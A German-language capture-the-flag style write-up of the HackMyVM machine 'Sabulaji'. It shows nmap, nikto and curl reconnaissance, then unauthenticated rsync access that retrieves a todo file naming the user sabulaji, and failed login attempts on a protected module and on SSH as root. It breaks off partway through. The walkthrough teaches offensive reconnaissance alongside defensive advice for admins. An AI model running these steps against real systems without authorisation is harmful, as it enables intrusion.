@@ -1,0 +1,1244 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sabulaji - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+     <div class="header-bg medium-bg">
+        <h1>Sabulaji - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container medium">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner medium-inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">netcat</div>
+                <div class="tool-item">rsync</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ll</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">crunch</div>
+                <div class="tool-item">while loop</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">diff</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">gtfobins</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                    <pre><span class="command">192.168.2.36</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Zu Beginn des Pentests suchte ich nach der Ziel-VM in meinem lokalen Netzwerk. Ich verwendete `arp-scan -l`, um das lokale Netzwerksegment zu scannen, filterte die Ausgabe mit `grep "PCS"`, um Hosts mit MAC-Adressen von PCS Systemtechnik zu identifizieren (häufig bei VirtualBox), und extrahierte die IP-Adresse mit `awk '{print $1}'`. Das Ergebnis war die IP-Adresse `192.168.2.36`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser erste Schritt war erfolgreich und lieferte schnell die IP-Adresse der Ziel-VM basierend auf ihrer bekannten MAC-Adresse. Die identifizierte IP-Adresse `192.168.2.36` war die Grundlage für alle weiteren Erkundungsschritte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie `arp-scan` zur schnellen Host-Erkennung im lokalen Netzwerk.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Netzwerkaktivitäten auf unautorisierte Scans.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.36 | grep open</span></div>
+                    <pre><span class="command">22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span>
+<span class="command">80/tcp  open  http    Apache httpd 2.4.62 ((Debian))</span>
+<span class="command">873/tcp open  rsync   (protocol version 31)</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte einen ersten schnellen Portscan mit Nmap auf die gefundene IP-Adresse `192.168.2.36` durch. Der Befehl verwendete Standardoptionen für einen schnellen Scan (`-sS -p- -T5`), Versionserkennung (`-sV`), Standard-Skripte (`-sC`) und OS-Erkennung (`-AO`). Die Ausgabe wurde mit `grep open` gefiltert, um sofort die offenen Ports zu sehen. Die Ergebnisse zeigten, dass die Ports 22 (SSH), 80 (HTTP) und 873 (Rsync) offen sind. Die Dienstversionen OpenSSH 8.4p1, Apache httpd 2.4.62 und Rsync (Protokoll Version 31) wurden identifiziert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser schnelle Scan lieferte einen klaren Überblick über die primäre Angriffsfläche. Die identifizierten offenen Ports und Dienstversionen sind die Grundlage für die weiteren Enumerations- und Angriffsversuche. Der offene Rsync-Port (873) ist besonders interessant, da er oft für Dateiübertragungen und Synchronisierung verwendet wird und potenzielle Informationslecks oder unauthentifizierten Zugriff ermöglichen kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginnen Sie immer mit einem schnellen Portscan, um die offenen Dienste zu identifizieren. Achten Sie auf ungewöhnliche offene Ports, die auf spezifische Dienste hinweisen.
+                <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der nach außen exponierten Dienste. Deaktivieren Sie unnötige Dienste.
+
+             </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.36</span></div>
+                    <pre><span class="command">Starting Nmap 7.95 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at 2025-06-11 12:38 CEST</span>
+<span class="command">Nmap scan report for sabu.hmv (192.168.2.36)</span>
+<span class="command">Host is up (0.00017s latency).</span>
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+<span class="command">22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span>
+| <span class="command">ssh-hostkey:</span>
+|   <span class="command">3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)</span>
+|   <span class="command">256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)</span>
+<span class="password">|_  ssh-hostkey: 256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)</span>
+<span class="command">80/tcp  open  http    Apache httpd 2.4.62 ((Debian))</span>
+<span class="password">|_http-title: epages</span>
+<span class="password">|_http-server-header: Apache/2.4.62 (Debian)</span>
+<span class="command">873/tcp open  rsync   (protocol version 31)</span>
+<span class="command">MAC Address: 08:00:27:AE:72:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Aggressive OS guesses: OpenWrt 21.02 (Linux 5.4) (96%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (96%), Linux 4.15 - 5.19...)</span>
+<span class="command">No exact OS matches for host (test conditions non-ideal).</span>
+<span class="command">Network Distance: 1 hop</span>
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+<span class="command">HOP RTT     ADDRESS</span>
+<span class="command">1   0.17 ms sabu.hmv (192.168.2.36)</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte einen vollständigen, detaillierten Nmap-Scan auf `sabu.hmv` (192.168.2.36) durch. Die Ausgabe bestätigte die offenen Ports 22 (SSH), 80 (HTTP) und 873 (Rsync) mit den identifizierten Versionen. Für Port 80 zeigte der HTTP-Titel "epages". Der Rsync-Dienst wurde als Protokollversion 31 identifiziert. Die OS-Erkennung schätzte das System als Linux ein. Die MAC-Adresse bestätigte die virtuelle Umgebung.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese detaillierte Nmap-Ausgabe lieferte alle notwendigen Informationen über die offen liegenden Dienste. Die genauen Versionen von OpenSSH und Apache sind relevant für die Suche nach Exploits. Der offene Rsync-Dienst auf Port 873 mit Protokollversion 31 ist der vielversprechendste Angriffspunkt, da Rsync oft unzureichend gesichert ist. Der HTTP-Titel "epages" deutet auf eine spezifische Webanwendung hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie die gefundenen Dienstversionen auf bekannte Schwachstellen. Priorisieren Sie ungewöhnliche Dienste wie Rsync auf Port 873. Recherchieren Sie gezielt nach Schwachstellen für diese spezifischen Dienste.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie alle unnötigen Dienste. Sichern Sie Rsync-Server strikt ab, verwenden Sie Authentifizierung und beschränken Sie den Zugriff nur auf benötigte Clients. Halten Sie alle Dienste auf dem neuesten Stand und patchen Sie bekannte Schwachstellen.
+
+             </p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://sabu.hmv</span></div>
+                    <pre><span class="command">- Nikto v2.5.0</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.36</span>
+<span class="command">+ Target Hostname:    sabu.hmv</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-11 12:39:18 (GMT2)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="password">+ Server: Apache/2.4.62 (Debian)</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.</span>
+<span class="command">  See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
+<span class="password">+ /: Server may leak inodes via ETags, header found with file /, inode: 8b8, size: 6353cb6850240, mtime: gzip. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]</span>
+<span class="password">+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .</span>
+<span class="command">+ 7962 requests: 0 error(s) and 4 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-11 12:39:37 (GMT2) (19 seconds)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ 1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte einen Nikto-Scan auf dem Webserver auf Port 80 (`http://sabu.hmv`) durch. Nikto prüfte auf gängige Web-Schwachstellen und Konfigurationsprobleme. Die Ausgabe bestätigte die Apache-Version und die erlaubten HTTP-Methoden (`HEAD`, `GET`, `POST`, `OPTIONS`). Es wies auf fehlende Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`) und ein potenzielles ETag-Problem hin (CVE-2003-1418). Es wurden keine CGI-Verzeichnisse gefunden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Nikto-Scan lieferte keine kritischen direkten Exploits für den Webserver, bestätigte aber allgemeine Konfigurationsprobleme (fehlende Header). Diese Funde sind weniger kritisch, aber Teil des Gesamtbildes der Sicherheitsposition. Der Webserver selbst schien keine offensichtlichen gängigen Web-Schwachstellen zu haben, die Nikto erkennen konnte. Die Konzentration musste auf andere Dienste, insbesondere Rsync, gerichtet werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beachten Sie alle Funde von automatisierten Scannern, auch die scheinbar weniger kritischen. Sie können auf die allgemeine Härtungsposition hindeuten.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Webserver mit empfohlenen Sicherheits-Headern.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://sabu.hmv</span></div>
+                    <pre><span class="command">* Host sabu.hmv:80 was resolved.</span>
+<span class="command">* IPv6: (none)</span>
+<span class="command">* IPv4: 192.168.2.36</span>
+<span class="command">*   Trying 192.168.2.36:80...</span>
+<span class="command">* Connected to sabu.hmv (192.168.2.36) port 80</span>
+<span class="command">* using HTTP/1.x</span>
+<span class="command">> HEAD / HTTP/1.1</span>
+<span class="command">> Host: sabu.hmv</span>
+<span class="command">> User-Agent: curl/8.13.0</span>
+<span class="command">> Accept: */*</span>
+<span class="command">></span>
+<span class="command">* Request completely sent off</span>
+<span class="command">< HTTP/1.1 200 OK</span>
+<span class="command">HTTP/1.1 200 OK</span>
+<span class="password">< Date: Wed, 11 Jun 2025 10:40:40 GMT</span>
+<span class="password">Date: Wed, 11 Jun 2025 10:40:40 GMT</span>
+<span class="password">< Server: Apache/2.4.62 (Debian)</span>
+<span class="password">Server: Apache/2.4.62 (Debian)</span>
+<span class="password">< Last-Modified: Fri, 16 May 2025 08:38:56 GMT</span>
+<span class="password">Last-Modified: Fri, 16 May 2025 08:38:56 GMT</span>
+<span class="password">< ETag: "8b8-6353cb6850240"</span>
+<span class="password">ETag: "8b8-6353cb6850240"</span>
+<span class="command">< Accept-Ranges: bytes</span>
+<span class="command">Accept-Ranges: bytes</span>
+<span class="command">< Content-Length: 2232</span>
+<span class="command">Content-Length: 2232</span>
+<span class="command">< Vary: Accept-Encoding</span>
+<span class="command">Vary: Accept-Encoding</span>
+<span class="password">< Content-Type: text/html</span>
+<span class="password">Content-Type: text/html</span>
+<span class="command"><</span>
+
+<span class="command">* Connection #0 to host sabu.hmv left intact</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich holte die HTTP-Header für die Hauptseite auf Port 80 mit `curl -Iv http://sabu.hmv` ab. Die Ausgabe bestätigte die Apache-Version und die erlaubten HTTP-Methoden, ähnlich wie Nikto. Die Header enthielten keine sofort ersichtlichen kritischen Informationen, außer den üblichen fehlenden Sicherheits-Headern.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die HTTP-Header-Analyse bestätigte die Webserver-Details, lieferte aber keine neuen Angriffspunkte. Die Konzentration blieb auf dem Rsync-Dienst.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Holen Sie immer die HTTP-Header ab, um Serverinformationen zu verifizieren.
+                <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Informationen, die in HTTP-Headern preisgegeben werden.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">epages</span>
+
+<span class="command">In der chinesischen Internetkultur ist Sabulaji ein Wort mit großer Persönlichkeit und Freude,</span>
+<span class="command">was die Pinyin-Transliterationsform von "dumm und nicht wenige Leute" ist.</span>
+
+<span class="command">"Silly is not a few bites" ist eine unbeschwerte und spielerische Art zu sagen, dass jemand ein</span>
+<span class="command">bisschen albern, albern, ein wenig abwertend, aber normalerweise weniger ernst und eher lustig</span>
+<span class="command">und selbstironisch ist.</span>
+
+<span class="command">Wenn Sie also sehen, dass sabulaji im Code, ID oder Tag erscheint, bedeutet das wahrscheinlich:</span>
+<span class="command">Diese Person ist entweder ein bisschen wie eine Zwei oder versteht das Meme wirklich.</span>
+
+<span class="command">___________________________________________________________________________________________________________________</span>
+
+<span class="command">http://sabu.hmv/icons/small/</span>
+
+<span class="command">Forbidden</span>
+
+<span class="command">You don't have permission to access this resource.</span>
+<span class="command">Apache/2.4.62 (Debian) Server at sabu.hmv Port 80</span>
+<span class="command">c</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich betrachtete den Inhalt der Hauptseite auf Port 80 (`http://sabu.hmv`). Die Seite trug den Namen "epages" (wie im HTTP-Titel) und enthielt einen Text, der die Bedeutung des Wortes "Sabulaji" in der chinesischen Internetkultur erklärte. Der Text beschrieb "Sabulaji" als Pinyin-Transliteration für "dumm und nicht wenige Leute" und wies darauf hin, dass das Wort im Code, ID oder Tag erscheinen könnte. Ein Versuch, auf das Verzeichnis `/icons/small/` zuzugreifen, führte zu einem "403 Forbidden" Fehler.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Webseite selbst lieferte keine direkten Schwachstellen oder Zugangsdaten, aber der Text über "Sabulaji" war ein sehr starker Hinweis. Die Erwähnung, dass das Wort im Code, ID oder Tag erscheinen könnte, zusammen mit der Bedeutung ("dumm und nicht wenige Leute"), legte nahe, dass "sabulaji" ein wichtiger Benutzername, ein Passwort oder ein Teil davon sein könnte. Der 403 Fehler auf `/icons/small/` zeigte, dass nicht alle Verzeichnisse zugänglich waren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt von Webseiten sorgfältig auf Hinweise oder versteckte Botschaften. Achten Sie auf Eigennamen, ungewöhnliche Wörter oder Sätze, die auf Benutzernamen, Passwörter oder Konzepte hinweisen könnten.
+                <br><strong>Empfehlung (Admin):</strong> Verwenden Sie keine offensichtlichen oder thematisch zusammenhängenden Wörter oder Phrasen als Benutzernamen oder Passwörter. Deaktivieren Sie die Verzeichnislistung und sichern Sie sensible Verzeichnisse.
+
+             </p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Rsync-Dienst auf Port 873 war der offensichtlichste Angriffspunkt. Ich testete die Verbindung mit Netcat (`nc -nv 192.168.2.36 873`). Die Antwort `@RSYNCD: 31.0` bestätigte, dass der Rsync-Daemon läuft und Protokollversion 31 verwendet. Ich nutzte anschließend das Nmap-Skript `rsync-list-modules` (`nmap -p 873 --script rsync-list-modules 192.168.2.36`), um verfügbare Rsync-Module aufzulisten. Die Ausgabe zeigte zwei Module: `public` mit der Beschreibung "Public Files" und `epages` mit der Beschreibung "Secret Documents".
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Rsync-Dienst war aktiv und hatte zwei Module konfiguriert. Das `public`-Modul klang nach frei zugänglichen Dateien, während das `epages`-Modul ("Secret Documents") sehr vielversprechend für das Auffinden sensibler Daten war. Die Möglichkeit, Rsync-Module aufzulisten, ist oft der erste Schritt zur Interaktion mit dem Dienst.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Rsync auf Port 873 offen ist, versuchen Sie immer, die verfügbaren Module aufzulisten (z.B. mit `rsync --list-modules` oder Nmap-Skripten).
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Rsync so, dass keine Module unauthentifiziert aufgelistet oder auf sie zugegriffen werden kann. Deaktivieren Sie die Modulauflistung.
+
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -nv 192.168.2.36 873</span></div>
+                    <pre><span class="command">(UNKNOWN) [192.168.2.36] 873 (rsync) open</span>
+<span class="password">@RSYNCD: 31.0</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -p 873 --script rsync-list-modules 192.168.2.36</span></div>
+                    <pre><span class="command">Starting Nmap 7.95 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at 2025-06-11 13:01 CEST</span>
+<span class="command">Nmap scan report for sabu.hmv (192.168.2.36)</span>
+<span class="command">Host is up (0.00016s latency).</span>
+
+<span class="command">PORT    STATE SERVICE</span>
+<span class="command">873/tcp open  rsync</span>
+<span class="command">| rsync-list-modules:</span>
+<span class="command">|</span>
+<span class="password">|   public         	Public Files</span>
+<span class="password">|_  epages         	Secret Documents</span>
+<span class="command">MAC Address: 08:00:27:AE:72:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+
+<span class="command">Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds</span></pre>
+                </div>
+            </div>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">mkdir public_files</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich erstellte ein lokales Verzeichnis auf meinem Kali-System (`public_files`), um die Dateien zu speichern, die ich vom `public` Rsync-Modul herunterladen würde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser organisatorische Schritt war notwendig, um die heruntergeladenen Dateien sauber zu speichern.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erstellen Sie lokale Verzeichnisse, um Daten von Zielsystemen systematisch zu speichern.
+                <br><strong>Empfehlung (Admin):</strong> Keine spezifische Empfehlung.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">rsync -av rsync://192.168.2.36/public/ ./public_files/</span></div>
+                    <pre><span class="command">receiving incremental file list</span>
+<span class="command">./</span>
+<span class="password">todo.list</span>
+
+<span class="command">sent 46 bytes  received 552 bytes  1.196,00 bytes/sec</span>
+<span class="command">total size is 433  speedup is 0,72</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich versuchte, Dateien vom `public` Rsync-Modul herunterzuladen. Ich verwendete den Befehl `rsync -av rsync://192.168.2.36/public/ ./public_files/`. Die Optionen `-a` (Archivmodus, kopiert rekursiv und behält Berechtigungen etc.) und `-v` (verbose) wurden verwendet. Ich versuchte, vom Modul `public` auf der Ziel-VM (`rsync://192.168.2.36/public/`) in mein lokales Verzeichnis `./public_files/` zu kopieren. Die Ausgabe zeigte, dass der Kopiervorgang startete (`receiving incremental file list`) und eine Datei namens `todo.list` heruntergeladen wurde. Der Vorgang wurde erfolgreich abgeschlossen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreich! Ich konnte ohne Authentifizierung auf das `public` Rsync-Modul zugreifen und die Datei `todo.list` herunterladen. Dies ist eine Schwachstelle, da unauthentifizierter Zugriff auf Rsync-Module oft sensible Daten preisgibt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie immer, ob Rsync-Module unauthentifizierten Zugriff erlauben. Laden Sie alle Dateien aus öffentlich zugänglichen Modulen herunter.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Rsync-Module so, dass sie Authentifizierung erfordern (`auth users`, `secrets file`) und/oder beschränken Sie den Zugriff per IP-Adresse (`hosts allow`).
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/public_files]
+└─# <span class="command">cat todo.list</span></div>
+                    <pre><span class="command">To-Do List</span>
+<span class="command">=========</span>
+
+<span class="password">1. sabulaji: Remove private sharing settings</span>
+   <span class="command">- Review all shared files and folders.</span>
+   <span class="command">- Disable any private sharing links or permissions.</span>
+
+<span class="password">2. sabulaji: Change to a strong password</span>
+   <span class="command">- Create a new password (minimum 12 characters, include uppercase, lowercase, numbers, and symbols).</span>
+   <span class="command">- Update the password in the system settings.</span>
+   <span class="command">- Ensure the new password is not reused from other accounts.</span>
+<span class="command">=========</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich las den Inhalt der heruntergeladenen Datei `todo.list` mit dem Befehl `cat todo.list`. Die Datei enthielt eine To-Do-Liste mit zwei Einträgen, die beide mit "sabulaji:" begannen und sich auf das Entfernen privater Freigabeeinstellungen und das Ändern zu einem starken Passwort bezogen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die `todo.list` Datei lieferte einen wichtigen Hinweis: Es gibt einen Benutzer namens `sabulaji`, der wahrscheinlich der Hauptbenutzer oder Administrator ist. Die To-Do-Einträge deuten darauf hin, dass es Probleme mit unsicheren Freigaben und einem schwachen Passwort für diesen Benutzer gab. Dies ist ein klarer Hinweis darauf, dass `sabulaji` ein Ziel für die Privilegieneskalation ist und dass Brute-Force-Angriffe auf seinen Account oder die Suche nach ungesicherten Freigaben aussichtsreich sein könnten. Der Name "sabulaji" stimmt mit dem Hinweis von der Webseite überein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie alle gefundenen Textdateien auf Benutzernamen, Passwörter, Hinweise oder To-Do-Listen. Diese können wertvolle Informationen für die weitere Vorgehensweise enthalten. Konzentrieren Sie sich auf den identifizierten Benutzernamen `sabulaji`.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals interne To-Do-Listen mit sensiblen Informationen (wie Benutzernamen und Hinweise auf Sicherheitsprobleme) in öffentlich zugänglichen Verzeichnissen.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">mkdir epages_files</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich erstellte ein weiteres lokales Verzeichnis auf meinem Kali-System (`epages_files`), um die Dateien vom `epages` Rsync-Modul zu speichern.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies war ein notwendiger organisatorischer Schritt, um die Dateien aus dem zweiten Rsync-Modul separat zu speichern.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Organisieren Sie heruntergeladene Daten systematisch.
+                <br><strong>Empfehlung (Admin):</strong> Keine spezifische Empfehlung.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">rsync -av rsync://192.168.2.36/epages/ ./epages_files/</span></div>
+                    <pre><span class="command">Password:</span>
+<span class="password">@ERROR: auth failed on module epages</span>
+<span class="command">rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.4.1]</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich versuchte, Dateien vom `epages` Rsync-Modul herunterzuladen (`rsync -av rsync://192.168.2.36/epages/ ./epages_files/`). Im Gegensatz zum `public`-Modul forderte das `epages`-Modul ein Passwort an (`Password:`). Da ich keins eingeben konnte (oder ein falsches eingab), schlug der Versuch mit der Fehlermeldung `@ERROR: auth failed on module epages` und `rsync error: error starting client-server protocol (code 5)` fehl.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Ergebnis bestätigte, dass das `epages` Rsync-Modul durch Authentifizierung geschützt ist. Dies ist eine korrekte Sicherheitskonfiguration. Um auf dieses Modul zugreifen zu können, musste ich das korrekte Passwort finden. Die Fehlermeldung ist klar und hilfreich für die Fehlersuche.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Rsync-Module Authentifizierung erfordern, versuchen Sie, Passwörter durch Brute-Force oder durch Ausnutzung anderer Schwachstellen zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Sichern Sie alle Rsync-Module durch Authentifizierung. Verwenden Sie starke Passwörter.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">rsync -av 192.168.2.36:module_name_1 /data/tmp</span></div>
+                    <pre><span class="command">The authenticity of host '192.168.2.36 (192.168.2.36)' can't be established.</span>
+<span class="command">ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.</span>
+<span class="command">This host key is known by the following other names/addresses:</span>
+<span class="command">    ~/.ssh/known_hosts:71: [hashed name]</span>
+<span class="command">    ~/.ssh/known_hosts:90: [hashed name]</span>
+<span class="command">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="command">Warning: Permanently added '192.168.2.36' (ED25519) to the list of known hosts.</span>
+
+<span class="command">root@192.168.2.36's password:</span>
+<span class="password">Permission denied, please try again.</span>
+
+<span class="command">root@192.168.2.36's password:</span>
+<span class="command">rsync error: received SIGINT, SIGTERM, or SIGHUP (code 20) at rsync.c(716) [Receiver=3.4.1]</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich versuchte, Rsync über SSH zu nutzen (`rsync -av 192.168.2.36:module_name_1 /data/tmp`), um zu sehen, ob ich mich per SSH mit Rsync-Funktionalität verbinden konnte. Der Befehl versuchte, eine Verbindung als `root` zum Zielsystem (`192.168.2.36`) herzustellen. Ich musste die Host-Authentizität bestätigen. Dann wurde ich nach dem Passwort für `root` gefragt. Ich gab ein falsches Passwort ein (oder ließ es leer), was zu "Permission denied" führte. Ich brach den Versuch dann ab.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Versuch, Rsync über SSH zu nutzen, bestätigte, dass SSH auf Port 22 aktiv war (was bereits im Nmap-Scan bekannt war) und dass der Root-Login über Passwort authentifiziert werden muss. Dies war nicht der primäre Weg, da das Rsync-Modul auf Port 873 das Hauptziel war und ein separater Dienst ist. Der Versuch war aber nützlich, um die SSH-Konfiguration zu überprüfen.
+            </p>
+            <p class="recommendation">
